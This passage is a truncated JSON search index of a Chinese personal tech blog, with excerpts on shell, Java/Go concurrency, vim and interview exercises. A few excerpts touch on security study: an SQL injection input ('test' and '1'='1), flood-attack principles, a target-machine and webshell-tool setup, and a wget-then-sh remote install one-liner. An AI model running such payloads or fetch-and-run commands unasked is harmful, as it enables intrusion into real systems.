-b","lvl0":"shell-awk","lvl1":null,"lvl2":"摘要","objectID":"aa7a64d47994fefd88862be5ce823968","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-awk/"},{"content":"shell备份学习 备份传输 ftp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #!/bin/bash #Author:LYR #Time:2021-10-03 23:24:40 #Name:app.sh ftp -inv \u0026lt;\u0026lt;EOF open 192.44.11.6 user ftp_user user_pwd cd /tmp # 1.txt 上传到 对方 tmp 目录 put 1.txt byte # 退出 EOF man ftp 查看 目录","lvl0":"shell-backup","lvl1":null,"lvl2":"摘要","objectID":"e4bfed74d512cb2868fe3441e138dd02","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-backup/"},{"content":"1. shell运算符 Bash 支持很多运算符，包括算数运算符、关系运算符、布尔运算符、字符串运算符和文件测试运算符。 awk 和 expr，expr 最常用 例如，","lvl0":"shell-char","lvl1":null,"lvl2":"摘要","objectID":"c1443de5fc1c913579fd5ebad81f95d1","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-char/"},{"content":"1. echo echo是Shell的一个内部指令，用于在屏幕上打印出指定的字符串。命令格式： 1 echo arg 您可以使用echo实现更复杂的输出格式控制。 1.1. 显示转","lvl0":"shell-echo","lvl1":null,"lvl2":"摘要","objectID":"0b727923abcdd3a9e41302faeb3d9ce6","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-echo/"},{"content":"1. 函数定义 函数可以让我们将一个复杂功能划分成若干模块，让程序结构更加清晰，代码重复利用率更高。Shell 也支持函数。Shell 函数必须先定义","lvl0":"shell-function","lvl1":null,"lvl2":"摘要","objectID":"99b544838b711a5dcdf3a67ed69e4754","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-function/"},{"content":"grep 的各种使用操作 grep awk, sed 三剑客 非常重要 grep 和 egrep 的使用方法 grep 语法形式 grep [option] [pattern ] [file1 ,file2] command | grep [option ] [pattern] -c 匹配行的数量，不显示具体内容 -w 匹配整词 -x 匹配整行 -l 只","lvl0":"shell-grep","lvl1":null,"lvl2":"摘要","objectID":"5a6d2f01d9d88834fa3b7d8d3c905a9a","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-grep/"},{"content":"1. if语句 if 语句通过关系运算符判断表达式的真假来决定执行哪个分支。Shell 有三种 if \u0026hellip; else 语句： if \u0026hellip; fi 语句； if \u0026hellip; else \u0026hellip; fi 语句； if \u0026hellip; elif \u0026hellip; else \u0026hellip; fi 语句","lvl0":"shell-if","lvl1":null,"lvl2":"摘要","objectID":"1d2e8e484684646205e20536a422916a","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-if/"},{"content":"1. shell简介 shell是用户和Linux内核之间的一层代理，解释用户输入的命令，传递给内核。 shell是一种脚本语言（解释性语言）。 Sh","lvl0":"shell-introduct","lvl1":null,"lvl2":"摘要","objectID":"7e2cd646c18e38b58e463dcd4200a39d","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-introduction/"},{"content":"1. for for循环一般格式为： 1 2 3 4 5 6 7 for 变量 in 列表 do command1 command2 ... commandN done 列表是一组值（数字、字符串等）组成的序列，每个值通过空格分隔。每循环一次，就","lvl0":"shell-loop","lvl1":null,"lvl2":"摘要","objectID":"7dd4ada99f2fac274f39ffe91e1b3a79","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-loop/"},{"content":"shell sed 学习 既然 sed 和awk都是Linux常见的命令，也是处理文件的常用的命令，但是两者还有哪些区别（除了 sed 一般对行进行操作，awk 对列进行操作）","lvl0":"shell-sed","lvl1":null,"lvl2":"摘要","objectID":"9ac37584ee5d9147c95275751091e01c","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-sed/"},{"content":"sort 升序 降序 -r reverse 反转 1 sort -n -r number.txt -o number.txt 1 2 3 4 5 6 7 8 9 10 [zookeeper@master rh]$ cat facebook.txt banana:30:5.5 apple:10:2.5 pear:90:2.3 orange:20:3.4 [zookeeper@master rh]$ sort -n -k 2 -t : facebook.txt apple:10:2.5 orange:20:3.4 banana:30:5.5 pear:90:2.3 这个文件有三列，列与列之间用冒号隔开了，第一列","lvl0":"shell-sort","lvl1":null,"lvl2":"摘要","objectID":"597f998269d21e1a9f24e4e30e5e190a","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-sort/"},{"content":"Unix 命令默认从标准输入设备(stdin)获取输入，将结果输出到标准输出设备(stdout)显示。一般情况下，标准输入设备就是键盘，标准输出设备","lvl0":"shell-stdout","lvl1":null,"lvl2":"摘要","objectID":"37bf4b1723c1430efa15c8da6db1b3aa","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-stdout/"},{"content":"1. shell变量 Shell支持自定义变量。 1.1. 定义变量 定义变量时，变量名不加美元符号（$），如： 1 variableName=\u0026#34;value\u0026#34; 注意，变量名和等号之间不能有空格，这可能和","lvl0":"shell-var","lvl1":null,"lvl2":"摘要","objectID":"fca3492e9306904388213aa181e01e11","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-var/"},{"content":"shell 函数调用 1 2 3 4 5 6 7 8 9 10 11 12 func() { name=yxc echo \u0026#34;Hello $name\u0026#34; return 123 } output=$(func) ret=$? echo \u0026#34;output = $output\u0026#34; echo \u0026#34;return = $ret\u0026#34; 输出结果： 1 2 output = Hello yxc return = 123 文件重定向原理 每个进程默认打开3个文件描","lvl0":"shell编程相关","lvl1":null,"lvl2":"摘要","objectID":"f442fb3d25f46d6840508b53311f785b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E7%BC%96%E7%A8%8B%E7%9B%B8%E5%85%B3/"},{"content":"shiro使用总结 口述： 自定义一个 realm 调用 login 方法，shiro 自动 去从 realm 里面获取用户信息， 然后 我这个 realm 注入 usermapper ，userMapper 或者 userService 获取 用户","lvl0":"shiro框架使用总结","lvl1":null,"lvl2":"摘要","objectID":"6a381052564da8f90607750b40200feb","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/shiro%E6%A1%86%E6%9E%B6/"},{"content":"作者：牛客636793145号 链接：https://www.nowcoder.com/discuss/650653 来源：牛客网 spring事","lvl0":"spring事务隔离级别","lvl1":null,"lvl2":"摘要","objectID":"deed7c6ab50fe0451b010296974c58f1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/spring%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB/"},{"content":"举个例子 1 2 3 4 select * from test where name = \u0026#39;test\u0026#39; and \u0026#39;1\u0026#39; = \u0026#39;1\u0026#39; # 程序的输入参数是 : test\u0026#39; and \u0026#39;1\u0026#39; = \u0026#39;1 # 技巧总结： test\u0026#39; and \u0026#39;1\u0026#39; = \u0026#39;1\u0026#39; --action=search SQL 注入的不同类型 时间盲注的用法 通过注入特定语句","lvl0":"sql注入漏洞","lvl1":null,"lvl2":"摘要","objectID":"20ae15b4db43122d6d98bcebf2f64e87","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9E%84%E5%BB%BA/"},{"content":"请你写一个函数 StrToInt，实现把字符串转换成整数这个功能。 当然，不能使用 atoi 或者其他类似的库函数。 样例 1 2 3 输入：\u0026#34;123\u0026#3","lvl0":"strTOint","lvl1":null,"lvl2":"摘要","objectID":"6f5d8e052180884dcd6817b8a30420b5","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E5%AD%97%E7%AC%A6%E4%B8%B2/strtoint/"},{"content":"golang 三色标记法 三色标记法为什么要 STW 强三色不变性 强制性 不允许黑色引用白色对象 【读写屏障，runtime复制判断】 弱三色不变性 黑色可以引用白色， 白","lvl0":"STW 和三色标记法","lvl1":null,"lvl2":"摘要","objectID":"c7f27c252a303ff3d703128fdfb225d6","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/golang%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/stw-%E5%92%8C%E4%B8%89%E8%89%B2%E6%A0%87%E8%AE%B0%E6%B3%95/"},{"content":"几种泛洪攻击原理 syn泛洪攻击 ack泛洪攻击 http泛洪攻击 slowloris 攻击 查看 系统 tcp连接状态 1 netstat -an | grep tcp syn泛洪的原理 客户端疯狂发送 syn 和服务器","lvl0":"SYN 泛洪攻击","lvl1":null,"lvl2":"摘要","objectID":"c988cd010ac65ca8ba3f9a4a6be49b13","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/syn-%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/"},{"content":"pool 的使用方法 像数据库连接、TCP 的长连接，这些连接在创建的时候是一个非常耗时的操 作。如果每次都创建一个新的连接对象，耗时较长，很可能整个业务","lvl0":"sync.Pool","lvl1":null,"lvl2":"摘要","objectID":"64b224c0867221b1df5aa130bf2703a1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/sync.pool/"},{"content":"学习视频参考 偏向锁撤销情景 调用 hashCode 调用waitNotify 多线程访问【升级为轻量级锁，要先撤销偏向锁】 锁消除和锁粗化 消除的 话，会对代码进行逃逸","lvl0":"synchronized锁优化","lvl1":null,"lvl2":"摘要","objectID":"287451ee2080f44e74563c01fa84586c","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/synchronized%E9%94%81%E4%BC%98%E5%8C%96_%E9%94%81%E5%81%8F%E5%90%91%E7%AD%89/"},{"content":"sz和 rz receive 和 send 1 2 yum install lrzsz 学习教程 mobaxterm ctrl + 右键点击屏幕","lvl0":"sz 和 rz命令","lvl1":["linux"],"lvl2":"摘要","objectID":"548ca26d937f78cfe2eab3716e290da9","tags":["linux"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/sz-%E5%92%8C-rz%E5%91%BD%E4%BB%A4/"},{"content":"题目1. 主机甲向主机乙发送一个(SYN=1,seq=11220)的TCP段,期望与主机乙建立TCP连接,若主机乙接受该连接请求,则主机乙向主","lvl0":"tcp理解刷题","lvl1":null,"lvl2":"摘要","objectID":"fed667b4f851d891ed7dedda741e54b0","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcp%E7%90%86%E8%A7%A3%E9%A2%98/"},{"content":"如何理解 Thread-Per-Message 模式 现实世界里，很多事情我们都需要委托他人办理，一方面受限于我们的能力，总有很多搞不定的事，比如教育小朋友，搞不定怎么办呢？只能委","lvl0":"Thread per message 模式","lvl1":null,"lvl2":"摘要","objectID":"b3d8d7d478f8982cfa2d7ed45b8c0f62","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/thread-per-message/"},{"content":"ThreadLocal的思想 参考博客 ThreadLocal 思想就是避免共享， 没有共享变量，就不会有并发问题 其本质上就是避免共享。你已经知道通过局部变量可以做到避","lvl0":"ThreadLocal模式","lvl1":null,"lvl2":"摘要","objectID":"c37fd464bd82b746badc44e87a8c9bda","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/threadlocal/"},{"content":"tmux 学习 首先screen是Linux中比较常用的可以“接入”和“离开”的shell对话框，很大的方便了我们ssh登录服务器跑任务，如果不用sc","lvl0":"tmux学习","lvl1":null,"lvl2":"摘要","objectID":"7f6bb2a87d7fb0753e52f601f68b2a2d","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/tmux/"},{"content":"云计算的三种模式 可以多了解一下云计算的东西 学习教程 iaas paas saas DAAS **DaaS 是Data as a Server的缩写，意思是数据即服务。**云端公司负责建立全部的I","lvl0":"TT面试笔试总结","lvl1":null,"lvl2":"摘要","objectID":"c0016ea8d3956f39521f108788bc3643","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/tt/"},{"content":"useradd 和 adduser 的区别 在root权限下，useradd只是创建了一个用户名，如 （useradd +用户名 ），它并没有在/home目录下创建同名文件夹，也","lvl0":"useradd 和 adduser","lvl1":null,"lvl2":"摘要","objectID":"ce73465367920ec6e970c59996b83086","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/useradd-%E5%92%8C-adduser%E7%9A%84%E5%8C%BA%E5%88%AB%E9%87%8D%E7%82%B9%E7%90%86%E8%A7%A3/"},{"content":"vagrant 的使用 1 2 3 4 vagrant ssh-config # 查看 vagrant的 ssh 配置 # 给 vscode 使用 1 2 3 4 5 6 7 8 9 10 HostdefaultHostName127.0.0.1UservagrantPort2222UserKnownHostsFile/dev/nullStrictHostKeyCheckingnoPasswordAuthenticationnoIdentityFileF:/vagrant/centos7/.vagrant/machines/default/virtualbox/private_keyIdentitiesOnlyyesLogLevelFATAL 为了方便使用，还是加个宝塔吧 1 2 3 yum install -y wget \u0026amp;\u0026amp; wget -O install.sh http://download.bt.cn/install/install.sh \u0026amp;\u0026amp; sh install.sh Bt-Panel:","lvl0":"vagrant的使用","lvl1":null,"lvl2":"摘要","objectID":"ad3b75ceb225889250d954c8a4264376","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/windows10%E5%AD%A6%E4%B9%A0/vagrant%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"content":"","lvl0":"vb脚本总结使用","lvl1":null,"lvl2":"摘要","objectID":"47c300fe7d9aee72c593781b83b7de7b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/windows10%E5%AD%A6%E4%B9%A0/vbscript%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/"},{"content":"可视模式 1、可视模式命令简介 在普通模式下输入 v（小写），进入字符选择模式，就可以移动光标，光标走过的地方就会选取。再次按下v后就会取消选取。","lvl0":"vim学习_可视模式【复制多行】","lvl1":null,"lvl2":"摘要","objectID":"f2fd14f3cbcce5b960f42682a850b094","tags":["shell命令学习","vim"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/%E5%8F%AF%E8%A7%86%E6%A8%A1%E5%BC%8F%E9%AA%9A%E6%93%8D%E4%BD%9C%E5%A4%8D%E5%88%B6%E5%A4%9A%E8%A1%8C/"},{"content":"1. vi的模式 1.1. 普通模式 由Shell进入vi编辑器时，首先进入普通模式。在普通模式下，从键盘输入任何字符都被当作命令来解释。普通模式下没有任何","lvl0":"vim快捷键","lvl1":null,"lvl2":"摘要","objectID":"2119fb737dd317bd391330f7d0a0ba46","tags":["shell命令学习","vim"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/vim%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"content":"插件安装 1 2 3 4 mkdir -p ~/.vim/bundle git clone https://github.com/gmarik/Vundle.vim.git ~/.vim/bundle/Vundle.vim 参考博客 安装博客2 我本地配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41","lvl0":"vim插件安装","lvl1":null,"lvl2":"摘要","objectID":"14136690cf0cd8dd854398045efabf86","tags":["shell命令学习","vim"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/vim%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85/"},{"content":"vimrc 中文版 由 https://blog.51cto.com/zpf666/2335640 转载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62","lvl0":"vim配置 .vimrc","lvl1":null,"lvl2":"摘要","objectID":"dd7baba91d39736c9d23f7fba90b53e5","tags":["shell命令学习","vim"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/vim%E9%85%8D%E7%BD%AE-.vimrc/"},{"content":"waitGroup 使用方法 比如，我们要完成一个大的任务，需要使用并行的 goroutine 执行三个小任务，只有这三 个小任务都完成，我们才能去执行后面的任务。如果通过轮询的方式","lvl0":"WaitGroup","lvl1":null,"lvl2":"摘要","objectID":"085c86a13dbd027d1f74a2165dffe792","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/waitgroup/"},{"content":"win7 靶机安装记录 win7 是 2009 年发布的，比较原始， win10 的话 比较高级了 ，很多东西不好操作。 安装教程 点击导航栏 -\u0026gt; 视图， 改为自动缩放模式 中国菜刀安装学习 工具原","lvl0":"win7靶机安装方式","lvl1":null,"lvl2":"摘要","objectID":"42ad3dd843d8b9cf6ab98567326d3036","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/windows10%E5%AD%A6%E4%B9%A0/win7%E9%9D%B6%E6%9C%BA%E5%AE%89%E8%A3%85%E6%96%B9%E5%BC%8F/"},{"content":"分区教程 磁盘管理-\u0026gt; 删除 -\u0026gt; 新建简单卷、 学习教程 2","lvl0":"windows10硬盘分区，容量分配","lvl1":null,"lvl2":"摘要","objectID":"c1c707821c9697863b9ca480863ec595","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/windows10%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80/%E5%88%86%E5%8C%BA%E6%95%99%E7%A8%8B/"},{"content":"基于 zookeeper的瞬时节点 实现分布式锁 基本概念 瞬时节点 不能有子节点， 会话连接一旦断开，瞬时节点就会删除 持久节点 可以有子节点 安装和下载 去","lvl0":"zookeeper分布式锁","lvl1":null,"lvl2":"摘要","objectID":"8bebf21f61fb6fc72891429c96a6f21f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/zookeeper/zookeeper%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"},{"content":"zookeeper 是什么 zookeeper 解决了什么问题? ZooKeeper是—个开源的分布式协同服务系统。 ZooKeeper的 设计目标是将那些复杂且容易出错的分布式协同服","lvl0":"zookeeper基础学习0","lvl1":null,"lvl2":"摘要","objectID":"45f8670e950bfe591465ed8bbf0d3ba2","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/zookeeper/zookeeper%E5%9F%BA%E7%A1%80/"},{"content":"学习视频 cms的核心算法三色标记法 三色标记法： 逻辑上的抽象，将对象分为3种颜色， 黑色，表示 已经标记完成，确认不是垃圾，灰色自己标记完成了，但","lvl0":"三色标记 cms核心算法","lvl1":null,"lvl2":"摘要","objectID":"9d8f016ddb0d037dceb2a639654b7092","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E5%85%AB%E8%82%A1%E6%B7%B1%E6%8C%96/%E4%B8%89%E8%89%B2%E6%A0%87%E8%AE%B0cms%E6%A0%B8%E5%BF%83/"},{"content":"给定一个长度为 $n+1$ 的数组nums，数组中所有的数均在 $1∼n$的范围内，其中 $n≥1$。 请找出数组中任意一个重复的数，但不能修改输入的数组。 样","lvl0":"不修改数组找出重复元素","lvl1":null,"lvl2":"摘要","objectID":"8867580ee7c31b53aba9aa02f1b8c4c1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%81%8D%E5%8E%86/%E4%B8%8D%E4%BF%AE%E6%94%B9%E6%95%B0%E7%BB%84%E6%89%BE%E5%87%BA%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0/"},{"content":"写一个函数，求两个整数之和，要求在函数体内不得使用 ＋、－、×、÷＋、－、×、÷ 四则运算符号。 样例 1 2 3 输入：num1 = 1 , num2 = 2 输出：3 代码","lvl0":"不用加减乘除实现加法","lvl1":null,"lvl2":"摘要","objectID":"57c0f5abbe8f9d9c9e6754d34fdcbe34","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%95%B0%E5%AD%A6%E9%97%AE%E9%A2%98/%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E5%8A%A0%E6%B3%95/"},{"content":"线程执行完或者出现异常就会进入终止状态。这样看，终止一个线程看上去很简单啊！一个线程执行完自己的任务，自己进入终止状态，这的确很简单。不过我","lvl0":"两阶段终止模式","lvl1":null,"lvl2":"摘要","objectID":"6048fcfc6637db3d7e8536b067c5a684","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E4%B8%A4%E9%98%B6%E6%AE%B5%E7%BB%88%E6%AD%A2%E6%A8%A1%E5%BC%8F%E4%BC%98%E9%9B%85%E7%9A%84%E5%81%9C%E6%AD%A2%E7%BA%BF%E7%A8%8B/"},{"content":"为什么要用 react react的历史背景 react 很简单 1个新的概念 4个必须的API 单向数据流 完善的错误提示 react解决了UI 细节的问题 数据模型怎么解决？","lvl0":"为什么要用react","lvl1":null,"lvl2":"摘要","objectID":"f5a8bae5416385a454b2a842d9544b61","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/react%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8react/"},{"content":"主动信息收集学习 基于ping探测 基于nmap扫描方式 使用 scapy 定制数据包进行高级扫描 僵尸扫描 主动信息收集原理 直接与目标系统交互通信 无法避免留下访","lvl0":"主动信息收集原理","lvl1":null,"lvl2":"摘要","objectID":"a6da239f475fc0963899f81b8bdff2ee","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/kali%E5%9F%BA%E7%A1%80/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%8E%9F%E7%90%86/"},{"content":"二叉搜索树转链表 输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。 要求不能创建任何新的结点，只能调整树中结点指针的指向。 注意： 需要","lvl0":"二叉搜索树转链表","lvl1":null,"lvl2":"摘要","objectID":"399eac9e194f33e9f05f613a501d5640","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E8%BD%AC%E9%93%BE%E8%A1%A8/"},{"content":"二叉树的下一个节点 